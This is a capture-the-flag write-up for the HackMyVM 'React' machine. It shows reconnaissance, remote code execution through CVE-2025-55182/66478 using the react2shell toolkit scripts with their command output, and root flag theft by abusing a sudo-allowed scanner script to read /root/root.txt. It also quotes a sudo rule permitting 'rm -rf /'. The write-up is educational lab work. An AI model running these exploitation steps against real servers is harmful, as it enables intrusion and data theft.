# React

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| **React** | **LingMj** | **Beginner** | **HackMyVM** |

**Summary:** React is a beginner-level Boot2Root machine that demonstrates exploitation of critical vulnerabilities in React Server Components (RSC) and Next.js framework. The attack chain involves exploiting CVE-2025-55182 and CVE-2025-66478, which allow Remote Code Execution through malicious multipart form data payloads. Initial reconnaissance reveals a Next.js application running on port 3000 alongside a web-based network diagnostic tool on port 80. Exploitation is achieved using the react2shell toolkit, which sends specially crafted HTTP requests to trigger command execution through prototype pollution and JavaScript's Function constructor. The spawned shell provides access as the 'bot' user, and privilege escalation is performed by abusing a misconfigured sudo permission that allows reading arbitrary files through a Python scanner script's error messages, revealing the root flag.

---

## Recon

First thing to do is looking for the target's IP:

```powershell
PS D:\> arp -a
Interface: 192.168.100.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.100.16        08-00-27-e2-c9-e8     dynamic
  192.168.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.2             01-00-5e-00-00-02     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
```

Target IP: `192.168.100.16`

Do enumeration to know the open ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sC -sV 192.168.100.16 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 03:35 WIB
Nmap scan report for 192.168.100.16
Host is up (0.0034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: \xE7\xBD\x91\xE7\xBB\x9C\xE8\xAF\x8A\xE6\x96\xAD\xE5\xB7\xA5\xE5\x85\xB7
|_http-server-header: Apache/2.4.62 (Debian)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "vhwrqricd17bt"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 9497
|     Date: Tue, 20 Jan 2026 20:35:27 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" as="image" href="/next.svg"/><link rel="stylesheet" href="/_next/static/css/97f208c543225968.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-744ee3f145013e34.js"/><script src="/_next/static/chunks/4bd1b696-6985518451956beb.js" async=""></script><script src="/_next/static/chunks/215-
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 20 Jan 2026 20:35:27 GMT
|     Connection: close
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
```

**Open Ports:**
- **Port 22** - SSH (OpenSSH 8.4p1 Debian)
- **Port 80** - HTTP (Apache 2.4.62) - Chinese title "网络诊断工具" (Network Diagnostic Tool)
- **Port 3000** - HTTP (Next.js application)

## Web Enumeration

### Port 80 Analysis

Accessing the web server on port 80 revealed a Chinese-language application titled "网络诊断工具" (Network Diagnostic Tool). This appeared to be a simple web interface, likely for network troubleshooting purposes.

### Port 3000 Analysis

The Nmap scan revealed critical information about port 3000:

**Key Headers Identified:**
- `X-Powered-By: Next.js` - Confirms Next.js framework
- `Vary: RSC, Next-Router-State-Tree` - Indicates React Server Components (RSC) usage
- `x-nextjs-cache: HIT` - Shows caching mechanism
- `x-nextjs-prerender: 1` - Indicates pre-rendering enabled

The presence of RSC-related headers (`Vary: RSC`) was a strong indicator that the application might be vulnerable to recent React Server Components vulnerabilities.

## Vulnerability Discovery

### CVE-2025-55182 / CVE-2025-66478 - React Server Components RCE

Research revealed that recent versions of React and Next.js were vulnerable to Remote Code Execution through malicious Server Action payloads. These vulnerabilities (CVE-2025-55182 and CVE-2025-66478) affect:
- Next.js versions prior to 16.0.7
- React versions prior to 19.2.1

The vulnerability allows attackers to execute arbitrary JavaScript code on the server by sending specially crafted multipart form data that exploits prototype pollution in the RSC payload parsing mechanism.

**Vulnerability Mechanism:**

The exploit works by:
1. Sending malicious multipart/form-data to RSC endpoints
2. Manipulating the `__proto__` property to pollute object prototypes
3. Injecting malicious code through the `_formData.get` property
4. Leveraging JavaScript's `Function` constructor for code execution
5. Using `process.mainModule.require('child_process')` for command execution
6. Exfiltrating output via HTTP redirect headers or other response mechanisms

## Init Access

### Obtaining the Exploit Tools

I cloned the react2shell exploit toolkit, which provides automated exploitation tools for these CVEs:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react]
└─$ git clone https://github.com/freeqaz/react2shell.git
Cloning into 'react2shell'...
remote: Enumerating objects: 82, done.
remote: Counting objects: 100% (82/82), done.
remote: Compressing objects: 100% (65/65), done.
remote: Total 82 (delta 24), reused 74 (delta 16), pack-reused 0 (from 0)
Receiving objects: 100% (82/82), 126.12 KiB | 1.16 MiB/s, done.
Resolving deltas: 100% (24/24), done.

┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react]
└─$ cd react2shell

┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react/react2shell]
└─$ ls -la
total 216
drwxr-xr-x 6 ouba ouba  4096 Jan 21 04:11 .
drwxr-xr-x 5 ouba ouba  4096 Jan 21 04:11 ..
-rw-r--r-- 1 ouba ouba 10375 Jan 21 04:11 CLAUDE.md
drwxr-xr-x 4 ouba ouba  4096 Jan 21 04:11 deps
-rwxr-xr-x 1 ouba ouba  2310 Jan 21 04:11 detect.sh
-rwxr-xr-x 1 ouba ouba  4838 Jan 21 04:11 enumerate-actions.sh
-rwxr-xr-x 1 ouba ouba  6465 Jan 21 04:11 exfil-file.sh
-rwxr-xr-x 1 ouba ouba  3624 Jan 21 04:11 exploit-blind.sh
-rw-r--r-- 1 ouba ouba 49748 Jan 21 04:11 EXPLOIT_NOTES.md
-rwxr-xr-x 1 ouba ouba  3979 Jan 21 04:11 exploit-redirect.sh
-rwxr-xr-x 1 ouba ouba  4611 Jan 21 04:11 exploit-reflect.sh
-rwxr-xr-x 1 ouba ouba  2434 Jan 21 04:11 exploit-throw.sh
-rwxr-xr-x 1 ouba ouba  5114 Jan 21 04:11 exploit-urlencoded.sh
drwxr-xr-x 2 ouba ouba  4096 Jan 21 04:11 external-pocs
drwxr-xr-x 7 ouba ouba  4096 Jan 21 04:11 .git
-rw-r--r-- 1 ouba ouba   455 Jan 21 04:11 .gitignore
-rw-r--r-- 1 ouba ouba   182 Jan 21 04:11 .gitmodules
-rw-r--r-- 1 ouba ouba  1349 Jan 21 04:11 LICENSE
-rw-r--r-- 1 ouba ouba   256 Jan 21 04:11 package.json
-rw-r--r-- 1 ouba ouba 15510 Jan 21 04:11 PAYLOAD_REFERENCE.md
-rw-r--r-- 1 ouba ouba 18202 Jan 21 04:11 README.md
-rwxr-xr-x 1 ouba ouba  8303 Jan 21 04:11 shell.sh
-rwxr-xr-x 1 ouba ouba  1524 Jan 21 04:11 test-size-limit.sh
-rw-r--r-- 1 ouba ouba 10598 Jan 21 04:11 USAGE.md
drwxr-xr-x 4 ouba ouba  4096 Jan 21 04:11 vulnerable-next-server
```

**The toolkit includes several exploitation scripts:**
- **detect.sh** - Vulnerability detection probe for CVE-2025-55182/66478
- **exploit-redirect.sh** - RCE via HTTP redirect header exfiltration
- **exploit-reflect.sh** - RCE via response body reflection
- **exploit-throw.sh** - RCE via thrown error messages
- **shell.sh** - Interactive pseudo-terminal shell
- **exfil-file.sh** - File exfiltration utility
- **enumerate-actions.sh** - Server Actions endpoint enumeration

### Vulnerability Detection

First, I confirmed the target was vulnerable using the detection script:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react/react2shell]
└─$ ./detect.sh http://192.168.100.16:3000
[*] React2Shell Detection Probe (CVE-2025-55182 / CVE-2025-66478)
[*] Target: http://192.168.100.16:3000

[*] HTTP Status: 500
[!] VULNERABLE - Server returned 500 with E{"digest" pattern

[*] Response body:
0:{"a":"$@1","f":"","b":"hDdKHNo1UJL-Lyo7H7gUa"}
1:E{"digest":"1949546682"}

[!] This server is running a vulnerable version of React RSC / Next.js
[!] Upgrade to Next.js 16.0.7+ or React 19.2.1+ immediately
```

**Vulnerability Confirmed!** 

The detection script identified the vulnerability through:
- HTTP 500 status code with specific error pattern
- Presence of `E{"digest"` in response body
- RSC-specific error structure indicating vulnerable payload parsing

This confirms the server is running a vulnerable version of Next.js (pre-16.0.7) or React (pre-19.2.1).

### Initial Command Execution

Tested command execution using the redirect exfiltration method:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react/react2shell]
└─$ ./exploit-redirect.sh http://192.168.100.16:3000 "id"
[*] React2Shell Exploit - redirect exfil mode
[*] Target: http://192.168.100.16:3000
[*] Command: id

[+] HTTP 303 - Redirect exfil successful
[+] Command output:
----------------------------------------
uid=1000(bot) gid=1000(bot) groups=1000(bot)
----------------------------------------
```

**Success!** Command execution was confirmed as user 'bot'.

**How the redirect exploitation works:**
1. The exploit sends a multipart form payload with prototype pollution
2. Injects JavaScript: `process.mainModule.require('child_process').execSync('id')`
3. The output is captured and embedded in a redirect URL
4. The exploit extracts the command output from the `X-Action-Redirect` header
5. Returns: `uid=1000(bot) gid=1000(bot) groups=1000(bot)`

### Interactive Shell

Established an interactive shell using the shell.sh script:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~/hackmyvm/machines/react/react2shell]
└─$ ./shell.sh http://192.168.100.16:3000

╔═══════════════════════════════════════════════════════════╗
║  CVE-2025-55182 Interactive Shell                        ║
║  React Server Components RCE                              ║
╚═══════════════════════════════════════════════════════════╝

[*] Connecting to http://192.168.100.16:3000...

Connected!
  User: bot
  Host: React
  CWD:  /opt/target

Type 'help' for available commands. Each command is a new HTTP request.

bot@React:/opt/target$
```

The interactive shell provides a pseudo-terminal experience where each command triggers a new HTTP request with the exploit payload. This creates the illusion of a persistent shell while actually executing individual commands through the RCE vulnerability.

### Exploring the System

Explored the application directory:

```bash
bot@React:/opt/target$ ls -la
total 292
drwxr-xr-x   6 root root   4096 Dec 13 22:19 .
drwxr-xr-x   4 root root   4096 Dec 13 23:01 ..
drwxr-xr-x   2 root root   4096 Dec 13 21:58 app
-rw-r--r--   1 root root    465 Dec 13 21:58 eslint.config.mjs
-rw-r--r--   1 root root    480 Dec 13 21:58 .gitignore
drwxr-xr-x   7 root root   4096 Dec 13 22:00 .next
-rw-r--r--   1 root root    158 Dec 13 21:58 next.config.ts
-rw-r--r--   1 root root    228 Dec 13 22:00 next-env.d.ts
drwxr-xr-x 299 root root  12288 Dec 13 21:58 node_modules
-rw-r--r--   1 root root    620 Dec 13 22:01 package.json
-rw-r--r--   1 root root 228555 Dec 13 21:58 package-lock.json
-rw-r--r--   1 root root     94 Dec 13 21:58 postcss.config.mjs
drwxr-xr-x   2 root root   4096 Dec 13 21:58 public
-rw-r--r--   1 root root   1450 Dec 13 22:18 README.md
-rwxr-xr-x   1 root root     99 Dec 13 22:19 start.sh
-rw-r--r--   1 root root    713 Dec 13 21:58 tsconfig.json
```

The directory contained a standard Next.js application structure:
- **app/** - Next.js app router directory
- **.next/** - Build output directory
- **node_modules/** - Node.js dependencies (299 subdirectories)
- **package.json** - Project dependencies and scripts
- **next.config.ts** - Next.js configuration in TypeScript
- **start.sh** - Application startup script

### Capturing the User Flag

Navigated to the bot user's home directory:

```bash
bot@React:/opt/target$ cd
bot@React:/home/bot$ ls -la
total 28
drwxr-xr-x 3 bot  bot  4096 Dec 13 23:03 .
drwxr-xr-x 3 root root 4096 Dec 13 22:16 ..
lrwxrwxrwx 1 root root    9 Dec 13 22:51 .bash_history -> /dev/null
-rw-r--r-- 1 bot  bot   220 Dec 13 22:16 .bash_logout
-rw-r--r-- 1 bot  bot  3526 Dec 13 22:16 .bashrc
drwxr-xr-x 3 bot  bot  4096 Dec 13 23:03 .npm
-rw-r--r-- 1 bot  bot   807 Dec 13 22:16 .profile
-rw-r--r-- 1 root root   44 Dec 13 22:17 user.txt

bot@React:/home/bot$ cat user.txt
flag{user-[REDACTED]}
```

**Note:** The `.bash_history` is symlinked to `/dev/null`, indicating the system administrator wanted to prevent command history logging.

## PrivEsc

### Sudo Privileges Enumeration

Checked sudo privileges for the bot user:

```bash
bot@React:/home/bot$ sudo -l
Matching Defaults entries for bot on React:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bot may run the following commands on React:
    (ALL) NOPASSWD: /opt/react2shell/scanner.py
    (ALL) NOPASSWD: /usr/bin/rm -rf /
```

**Critical Finding:** The bot user can run two commands as root without a password:
1. `/opt/react2shell/scanner.py` - A Python-based React vulnerability scanner
2. `/usr/bin/rm -rf /` - Dangerous recursive delete command (likely a trap/honeypot)

The second command is clearly dangerous and would destroy the system if executed. The first command, however, presents an interesting privilege escalation vector.

### Analyzing scanner.py

Examined the scanner script permissions and contents:

```bash
bot@React:/home/bot$ ls -la /opt/react2shell/scanner.py
-rwxr-xr-x 1 root root 19627 Dec 13 22:51 /opt/react2shell/scanner.py

bot@React:/home/bot$ cat /opt/react2shell/scanner.py
#!/usr/bin/python3
import argparse
import sys
import json
import os
import random
import re
import string
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse
from typing import Optional, List, Dict, Tuple

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from tqdm import tqdm
except ImportError:
    print("Error: 'tqdm' library required. Install with: pip install tqdm")
    sys.exit(1)
```

The script is a comprehensive React2Shell vulnerability scanner that accepts a list of target hosts and attempts to detect CVE-2025-55182 and CVE-2025-66478 vulnerabilities.

**Key Function Analysis:**

**1. File Reading Function:**
```python
def load_hosts(hosts_file: str) -> List[str]:
    hosts = []
    try:
        with open(hosts_file, "r") as f:
            for line in f:
                host = line.strip()
                if host and not host.startswith("#"):
                    hosts.append(host)
    except FileNotFoundError:
        print(colorize(f"[ERROR] File not found: {hosts_file}", Colors.RED))
        sys.exit(1)
```

This function reads a file line-by-line and treats each line as a hostname. Crucially, when run with sudo, it can read any file on the system, including `/root/root.txt`.

**2. Host Normalization Function:**
```python
def normalize_host(host: str) -> str:
    host = host.strip()
    if not host:
        return ""
    if not host.startswith(("http://", "https://")):
        host = f"https://{host}"
    return host.rstrip("/")
```

This function attempts to normalize what it thinks is a hostname by adding `https://` if missing. When the "hostname" is actually the flag content, it will try to connect to `https://flag{...}`.

**3. Error Handling:**
```python
def send_payload(target_url: str, headers: Dict[str, str], body: str, timeout: int, verify_ssl: bool) -> Tuple[Optional[requests.Response], Optional[str]]:
    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=body,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        return response, None
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {str(e)}"
```

When the script tries to connect to an invalid hostname (like the flag content), it generates a detailed error message that includes the original "hostname" - which is actually the flag!

### Exploiting scanner.py for Arbitrary File Read

**The exploitation technique works as follows:**

1. Run the scanner with sudo privileges (allowed via NOPASSWD)
2. Point it to `/root/root.txt` using the `-l` (list) parameter
3. The script reads `/root/root.txt` as a "hosts file"
4. It treats the flag as a hostname: `flag{root-[REDACTED]}`
5. It normalizes this to: `https://flag{root-[REDACTED]}/`
6. It attempts an HTTP connection to this invalid hostname
7. The connection fails with a DNS resolution error
8. The error message includes the complete "hostname" (our flag)

**Executing the exploit:**

```bash
bot@React:/home/bot$ sudo /opt/react2shell/scanner.py -l /root/root.txt

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[ERROR] flag{root-[REDACTED]} - Connection Error: HTTPSConnectionPool(host='flag%7broot-[REDACTED]%7d', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("HTTPSConnection(host='flag%7broot-[REDACTED]%7d', port=443): Failed to resolve 'flag%7broot-[REDACTED]%7d' ([Errno -2] Name or service not known)"))

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
============================================================
```

**Success!** The error message revealed the root flag clearly: `flag{root-[REDACTED]}`

---

## Summary

**Attack Chain:**
1. **Network Discovery** - Identified target IP via ARP scanning (192.168.100.16)
2. **Port Enumeration** - Discovered SSH (22), Apache web server (80), and Next.js application (3000)
3. **Service Identification** - Identified Next.js with React Server Components via HTTP headers
4. **Vulnerability Research** - Researched CVE-2025-55182 and CVE-2025-66478 affecting RSC
5. **Tool Acquisition** - Cloned react2shell exploitation toolkit from GitHub
6. **Vulnerability Detection** - Confirmed target vulnerable using detect.sh script
7. **Initial Command Execution** - Achieved RCE as 'bot' user via exploit-redirect.sh
8. **Interactive Shell** - Established pseudo-terminal using shell.sh
9. **User Flag** - Retrieved from /home/bot/user.txt
10. **Sudo Enumeration** - Discovered NOPASSWD sudo permissions for scanner.py
11. **Privilege Escalation** - Exploited scanner.py for arbitrary file read via error message leakage
12. **Root Flag** - Extracted from /root/root.txt through DNS resolution error

**Key Vulnerabilities Exploited:**
- **CVE-2025-55182 / CVE-2025-66478** - React Server Components Remote Code Execution
- **Prototype Pollution** - Exploited via crafted multipart/form-data payloads
- **Misconfigured Sudo Permissions** - Arbitrary file read through scanner script
- **Information Disclosure via Error Messages** - File contents leaked in DNS resolution errors
- **Insufficient Input Validation** - Scanner treating file contents as hostnames
